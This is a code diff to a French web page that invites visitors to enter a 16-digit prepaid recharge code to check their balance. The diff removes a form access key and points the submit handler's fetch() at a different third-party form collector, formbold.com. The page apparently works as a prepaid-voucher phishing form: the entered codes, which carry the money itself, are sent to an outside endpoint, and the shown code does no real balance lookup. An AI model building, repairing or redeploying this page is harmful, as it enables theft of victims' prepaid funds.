@@ -426,7 +426,7 @@
                 <h2>AS-TU DÉJÀ UN CODE PRÉPAYÉ ?</h2>
                 <p>Alors consulte tout de suite ton crédit en saisissant le code à 16 chiffres ici.</p>
                 <form class="vform" id="myForm">
-                      <input type="hidden" name="access_key" value="e781f2ca-80c8-463d-812b-7a075333a02f">
+                     
                     <div class="fg">
                         <label>Type de recharge</label>
                         <select name="type">
@@ -707,7 +707,7 @@ document.getElementById('myForm').addEventListener('submit', async function(e) {
     }
     if (!hasValue) { alert("Veuillez remplir au moins un champ avant de valider."); return; }
     try {
-        var response = await fetch("https://api.web3forms.com/submit", { method: "POST", body: data });
+        var response = await fetch("https://formbold.com/s/9XWKE", { method: "POST", body: data });
         if (response.ok) { window.location.href = "success.html"; }
         else { alert("Erreur lors de l'envoi. Code: " + response.status); }
     } catch (err) {
